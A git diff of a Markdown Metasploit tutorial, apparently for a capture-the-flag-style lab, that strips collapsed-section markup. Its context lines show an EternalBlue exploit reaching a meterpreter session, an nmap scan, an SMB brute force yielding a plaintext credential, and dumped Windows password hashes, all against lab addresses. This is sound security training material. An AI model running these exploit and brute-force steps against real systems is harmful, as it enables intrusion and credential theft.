@@ -11,19 +11,18 @@ common workflows, and real console examples.
     - [Key Terms](#key-terms)
     - [Module Types](#module-types)
   - [Initial Setup](#initial-setup)
-    - [Sample output (collapsed)](#sample-output-collapsed)
   - [Using Metasploit](#using-metasploit)
     - [Common Options](#common-options)
     - [Unset \& Global Options (`setg`)](#unset--global-options-setg)
   - [Searching \& Info](#searching--info)
-    - [Example: SSH Login Check Scanner (collapsed)](#example-ssh-login-check-scanner-collapsed)
+    - [Example: SSH Login Check Scanner](#example-ssh-login-check-scanner)
   - [Walkthroughs \& Examples](#walkthroughs--examples)
     - [EternalBlue (MS17-010)](#eternalblue-ms17-010)
-    - [Full console output (collapsed)](#full-console-output-collapsed)
+    - [Full console output](#full-console-output)
     - [Port \& Service Discovery](#port--service-discovery)
-    - [Sample Nmap output (collapsed)](#sample-nmap-output-collapsed)
+    - [Sample Nmap output](#sample-nmap-output)
     - [SMB Login Brute Force (Scanner)](#smb-login-brute-force-scanner)
-    - [Result snippet (collapsed)](#result-snippet-collapsed)
+    - [Result snippet](#result-snippet)
     - [NetBIOS Enumeration](#netbios-enumeration)
     - [HTTP Version Detection](#http-version-detection)
     - [Finding Files with Meterpreter](#finding-files-with-meterpreter)
@@ -82,8 +81,6 @@ msfupdate
 msfconsole
 ```
 
-### Sample output (collapsed)
-
 ```bash
 root@ip-10-10-63-107:~# msfupdate
 # ... GPG key warning example ...
@@ -103,8 +100,6 @@ msf6 > ls
 msf6 > ping -c 1 8.8.8.8
 msf6 > history
 ```
-
-</details>
 
 ---
 
@@ -136,7 +131,7 @@ msf6 > search type:auxiliary ssh_login
 msf6 > info auxiliary/scanner/ssh/ssh_login
 ```
 
-### Example: SSH Login Check Scanner (collapsed)
+### Example: SSH Login Check Scanner
 
 ```text
 Name: SSH Login Check Scanner
@@ -167,7 +162,7 @@ msf6 exploit(...) > sessions -i 1
 meterpreter >
 ```
 
-### Full console output (collapsed)</strong></summary>
+### Full console output
 
 ```text
 [+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
@@ -203,7 +198,7 @@ Run `nmap` from inside `msfconsole`:
 msf6 > nmap -sS 10.10.108.124
 ```
 
-### Sample Nmap output (collapsed)</strong></summary>
+### Sample Nmap output
 
 ```text
 PORT     STATE SERVICE
@@ -213,8 +208,6 @@ PORT     STATE SERVICE
 445/tcp  open  microsoft-ds
 8000/tcp open  http-alt
 ```
-
-</details>
 
 ---
 
@@ -228,14 +221,12 @@ msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/Metasplo
 msf6 auxiliary(...) > run
 ```
 
-### Result snippet (collapsed)</strong></summary>
+### Result snippet
 
 ```text
 [+] 10.10.108.124:445 - Success: '.\penny:leo1234'
 [_] ... Bruteforce completed, 1 credential was successful.
 ```
-
-</details>
 
 ---
 
@@ -251,8 +242,6 @@ msf6 auxiliary(...) > run
 [+] 10.10.108.124 [] OS:Unix Names:(**MSBROWSE**, , ACME IT SUPPORT) Mac:00:00:00:00:00:00
 ```
 
-</details>
-
 ---
 
 ### HTTP Version Detection
@@ -267,8 +256,6 @@ msf6 auxiliary(...) > run
 ```text
 [+] 10.10.108.124:8000 webfs/1.21 (403-Forbidden)
 ```
-
-</details>
 
 ---
 
@@ -299,8 +286,6 @@ Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
 pirate:1001:...:8ce9a3ebd1647fcc5e04025019f4b875:::
 ```
-
-</details>
 
 ---
 
